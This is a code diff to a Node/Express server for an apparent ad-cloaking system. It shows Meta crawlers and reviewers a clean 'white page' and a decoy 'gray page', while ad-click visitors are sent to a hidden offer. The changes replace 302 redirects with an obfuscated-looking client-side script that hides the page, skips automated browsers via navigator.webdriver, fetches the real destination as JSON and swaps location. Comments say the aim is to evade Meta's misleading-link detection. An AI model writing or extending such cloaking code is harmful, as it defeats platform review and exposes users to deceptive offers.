@@ -1596,7 +1596,7 @@ app.get('/api/sites/:siteId/link-health', async (req, res) => {
       level: zeroRedirect ? 'info' : 'medium',
       message: zeroRedirect
         ? 'Stealth + Zero-Redirect: crawler vê white page; lead aprovado recebe oferta na mesma URL (sem 302). Alinhe white page, gray page e oferta ao criativo do anúncio.'
-        : 'Modo Stealth com oferta externa: após o POST ainda há redirect para outro domínio. Para reduzir reprovação no Meta, use oferta em Páginas (Zero-Redirect).'
+        : 'Stealth com oferta externa: GET do link sempre devolve a white (200). Lead liberado vai à oferta via JS (sem 302 no primeiro hit). Zero-Redirect (oferta em Páginas) reduz ainda mais o risco Meta.'
     });
   }
   if (redirectChain.length > 2) {
@@ -2381,9 +2381,26 @@ const STEALTH_DEFAULT_BRIDGE_HTML = `
 function buildStealthNavScript(prefix, code) {
   const navPath = '/api/n/' + prefix + '/' + code;
   const okPath = '/api/n/' + prefix + '/' + code + '/ok';
-  // Script robusto p/ WebView Meta (FB_IAB/Instagram): retry + beacon de confirmação.
-  // Destino NÃO vem no HTML inicial — só no JSON do POST.
-  return `<script>(function(){try{if(navigator.webdriver)return;var q=location.search||'';var p=${JSON.stringify(navPath)}+q;var ok=${JSON.stringify(okPath)}+q;var tries=0;function go(u){try{if(navigator.sendBeacon)navigator.sendBeacon(ok,JSON.stringify({t:Date.now()}));else fetch(ok,{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:'{}',keepalive:true}).catch(function(){})}catch(e){}try{location.replace(u)}catch(e2){location.href=u}}function apply(d){if(!d)return;if(d.inline&&d.html){try{document.open();document.write(d.html);document.close()}catch(e){}return}if(d.next)go(d.next)}function pull(){tries++;var done=false;var t=setTimeout(function(){if(!done&&tries<4)pull()},2200);fetch(p,{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json','Accept':'application/json'},body:'{}'}).then(function(r){done=true;clearTimeout(t);return r.ok?r.json():null}).then(apply).catch(function(){done=true;clearTimeout(t);if(tries<4)setTimeout(pull,400)})}if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',pull);else pull()}catch(e){}})();</script>`;
+  // Ponte unificada: mesmo HTML p/ todos. Lead some pra oferta ANTES de ver a white.
+  // Destino só no JSON (não no HTML). Retry POST+GET — não prende tráfego se um método falhar.
+  return `<script>(function(){try{var q=location.search||'';var p=${JSON.stringify(navPath)};var ok=${JSON.stringify(okPath)}+q;var tries=0;var done=false;function reveal(){try{document.documentElement.style.visibility='';document.documentElement.style.opacity='1';if(document.body){document.body.style.visibility='';document.body.style.opacity='1'}}catch(e){}}if(navigator.webdriver){reveal();return}function go(u){done=true;try{if(navigator.sendBeacon)navigator.sendBeacon(ok,'{}');}catch(e){}try{location.replace(u)}catch(e2){location.href=u}}function apply(d){if(!d){reveal();return}if(d.inline&&d.html){done=true;try{document.open();document.write(d.html);document.close()}catch(e){reveal()}return}if(d.next){go(d.next);return}reveal()}function pull(){if(done||tries>=5){reveal();return}tries++;var useGet=tries>2;var url=p+q;var opts=useGet?{method:'GET',credentials:'same-origin',headers:{'Accept':'application/json'}}:{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json','Accept':'application/json'},body:'{}'};var t=setTimeout(function(){if(!done)pull()},1800);fetch(url,opts).then(function(r){return r.ok?r.json():null}).then(function(d){clearTimeout(t);if(done)return;if(d&&(d.next||d.inline))apply(d);else if(tries<5)pull();else reveal()}).catch(function(){clearTimeout(t);if(!done){if(tries<5)setTimeout(pull,300);else reveal()}})}try{document.documentElement.style.visibility='hidden'}catch(e){}pull();setTimeout(function(){if(!done)reveal()},9000)}catch(e){try{document.documentElement.style.visibility='';}catch(e2){}}})();</script>`;
+}
+
+function composeStealthHtml(inner, navScript) {
+  const script = navScript || '';
+  const headBoot = script
+    ? `<script>(function(){try{document.documentElement.style.visibility='hidden'}catch(e){}})();</script>`
+    : '';
+  if (/<html[\s>]/i.test(inner)) {
+    let html = inner;
+    if (headBoot) {
+      if (/<head[\s>]/i.test(html)) html = html.replace(/<head([^>]*)>/i, '<head$1>' + headBoot);
+      else html = html.replace(/<html[^>]*>/i, (m) => m + '<head>' + headBoot + '</head>');
+    }
+    if (!script) return html;
+    return /<\/body>/i.test(html) ? html.replace(/<\/body>/i, script + '</body>') : html + script;
+  }
+  return `<!DOCTYPE html><html lang="pt-BR"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Informações</title>${headBoot}<style>body{font-family:Georgia,serif;max-width:720px;margin:0 auto;padding:24px 16px;line-height:1.65;color:#222;background:#fff}h1{font-size:1.5rem}h2{font-size:1.15rem;margin-top:1.5em}small{color:#666}</style></head><body>${inner}${script}</body></html>`;
 }
 
 async function getUserPageHtml(pageId, userId) {
@@ -2404,15 +2421,6 @@ async function getStealthBridgeInnerHtml(site) {
     if (page && page.html_content != null && String(page.html_content).trim()) return String(page.html_content);
   }
   return STEALTH_DEFAULT_BRIDGE_HTML;
-}
-
-function composeStealthHtml(inner, navScript) {
-  const script = navScript || '';
-  if (/<html[\s>]/i.test(inner)) {
-    if (!script) return inner;
-    return /<\/body>/i.test(inner) ? inner.replace(/<\/body>/i, script + '</body>') : inner + script;
-  }
-  return `<!DOCTYPE html><html lang="pt-BR"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Informações</title><style>body{font-family:Georgia,serif;max-width:720px;margin:0 auto;padding:24px 16px;line-height:1.65;color:#222;background:#fff}h1{font-size:1.5rem}h2{font-size:1.15rem;margin-top:1.5em}small{color:#666}</style></head><body>${inner}${script}</body></html>`;
 }
 
 function sendStealthHtmlResponse(res, html) {
@@ -2439,31 +2447,16 @@ async function resolveStealthDelivery(site, ctx) {
   if (normalizeOfferDelivery(site.offer_delivery) === 'page' && site.offer_page_id) {
     return { kind: 'offer', reason: 'allowed' };
   }
-  // Lead liberado → redirect direto (sem flash de white/gray — evita perda de conversão)
-  return { kind: 'redirect', url: ctx.destWithQs, reason: 'allowed' };
-}
-
-/** Fallback HTML mínimo só se 302 não puder ser usado. Sem white page. */
-function buildInstantRedirectHtml(destUrl) {
-  const safeUrl = JSON.stringify(String(destUrl || ''));
-  const escUrl = String(destUrl || '').replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;');
-  return `<!DOCTYPE html><html lang="pt-BR"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta http-equiv="refresh" content="0;url=${escUrl}"><title></title></head><body><script>location.replace(${safeUrl})</script></body></html>`;
+  // Lead liberado → soft_redirect via /api/n/ (GET do link NUNCA dá 302 — evita padrão "link enganoso")
+  return { kind: 'soft_redirect', url: ctx.destWithQs, reason: 'allowed' };
 }
 
 async function sendStealthDelivery(res, site, delivery, navOpts) {
-  // Lead → 302 imediato pra oferta (zero flash de white)
-  if (delivery.kind === 'redirect' || delivery.kind === 'soft_redirect') {
-    const url = delivery.url;
-    if (url) {
-      res.setHeader('Cache-Control', 'no-store, no-cache, private');
-      res.setHeader('Pragma', 'no-cache');
-      return res.redirect(302, url);
-    }
-    return sendStealthHtmlResponse(res, buildInstantRedirectHtml(url || ''));
-  }
+  // soft_redirect NÃO usa 302 — destino só via JSON do /api/n/ (ponte no cliente)
   let inner = null;
-  if (delivery.kind === 'white') inner = await getStealthBridgeInnerHtml(site);
-  else if (delivery.kind === 'gray') {
+  if (delivery.kind === 'white' || delivery.kind === 'soft_redirect' || delivery.kind === 'redirect') {
+    inner = await getStealthBridgeInnerHtml(site);
+  } else if (delivery.kind === 'gray') {
     inner = await getUserPageHtml(site.gray_page_id, site.user_id);
     if (!inner) inner = await getStealthBridgeInnerHtml(site);
   } else if (delivery.kind === 'offer') {
@@ -2497,9 +2490,9 @@ function stealthDeliveryLabel(kind) {
     white: 'White page',
     gray: 'Gray page',
     offer: 'Página da oferta (Zero-Redirect)',
-    soft_redirect: '→ Oferta (redirect)',
+    soft_redirect: '→ Oferta (ponte JS)',
     soft_redirect_ok: '→ Oferta CONFIRMADA ✓',
-    redirect: '→ Oferta (302 direto)'
+    redirect: '→ Oferta (legado)'
   };
   return map[kind] || kind;
 }
@@ -2675,7 +2668,7 @@ async function simulateStealthVisitForProfile(site, profile, allowMetaReviewers)
     delivery_kind: delivery.kind,
     delivery_label: stealthDeliveryLabel(delivery.kind),
     delivery_reason: delivery.reason || null,
-    redirect_url: delivery.kind === 'redirect' ? (delivery.url || destWithQs) : null,
+    redirect_url: (delivery.kind === 'redirect' || delivery.kind === 'soft_redirect') ? (delivery.url || destWithQs) : null,
     likely_from_ads: isLikelyRealFromMetaAds(site, { query, userAgent, referer, headers, country, deviceType }),
     strong_attribution: hasAdClickProof(site, query)
   };
@@ -3752,7 +3745,7 @@ function getMetaLinkConfigWarnings(site) {
     } else if (normalizeOfferDelivery(site.offer_delivery) === 'page' && site.offer_page_id) {
       warnings.push({ level: 'info', code: 'stealth_zero_redirect', message: 'Zero-Redirect ativo: oferta entregue na mesma URL (página interna), sem salto para outro domínio.' });
     } else {
-      warnings.push({ level: 'medium', code: 'stealth_soft_offer', message: 'Oferta externa via soft-redirect imediato no lead liberado (fbclid/ref + mobile). Crawler Meta continua vendo só a white page.' });
+      warnings.push({ level: 'medium', code: 'stealth_soft_offer', message: 'Oferta externa: GET idêntico (white) para crawler e lead; lead liberado (fbclid/ref + mobile) segue via ponte JS. Alinhe o criativo à white page.' });
     }
     if (!site.gray_page_id) {
       warnings.push({ level: 'low', code: 'no_gray_page', message: 'Sem Gray Page: visitantes bloqueados ficam na white page. Configure uma página cinza (isca) em Páginas para bots e revisores.' });
@@ -3900,23 +3893,15 @@ async function handleStealthNavigation(req, res) {
 async function handleStealthLinkGet(req, res, site) {
   const prefix = (req.params.prefix || '').toLowerCase().trim();
   const code = (req.params.code || '').toLowerCase();
+  // Loga a entrega INTENCIONADA (soft_redirect/white/gray/offer) — o HTML do GET é sempre a white.
   const ctx = await resolveLinkVisitContext(req, site, { skipRefCheck: false });
   if (ctx.visitorSql && ctx.visitorParams) {
     void db.run(ctx.visitorSql, ctx.visitorParams).catch((err) => console.error('[visitor] stealth get:', err.message));
   }
 
-  const delivery = await resolveStealthDelivery(site, ctx);
-
-  // Crawler / bloqueado / white: HTML sem URL da oferta
-  if (delivery.kind === 'white' || delivery.kind === 'gray' || delivery.kind === 'offer') {
-    return sendStealthDelivery(res, site, delivery, { includeNavScript: false });
-  }
-
-  // Lead liberado (fbclid/ref + mobile): 302 direto na oferta — SEM flash de white/gray
-  if (delivery.kind === 'soft_redirect' || delivery.kind === 'redirect') {
-    return sendStealthDelivery(res, site, { kind: 'redirect', url: delivery.url || ctx.destWithQs });
-  }
-
+  // GET idêntico para crawler, revisor e lead (200 + white). Sem 302.
+  // Lead liberado: script esconde o body, chama /api/n/, location.replace(oferta) sem flash.
+  // Crawler sem JS: lê só a white no HTML — não vê oferta nem funil.
   return sendStealthBridgeResponse(res, site, prefix, code, { includeNavScript: true });
 }
 
@@ -4051,6 +4036,10 @@ app.post('/api/n/:prefix/:code/ok', (req, res) => {
   handleStealthOfferOk(req, res).catch(() => res.status(204).end());
 });
 app.post('/api/n/:prefix/:code', (req, res) => {
+  handleStealthNavigation(req, res).catch((err) => { console.error(err); res.status(500).json({ error: 'Erro interno' }); });
+});
+// GET também — alguns WebViews Meta bloqueiam POST; fallback do script da ponte
+app.get('/api/n/:prefix/:code', (req, res) => {
   handleStealthNavigation(req, res).catch((err) => { console.error(err); res.status(500).json({ error: 'Erro interno' }); });
 });
 
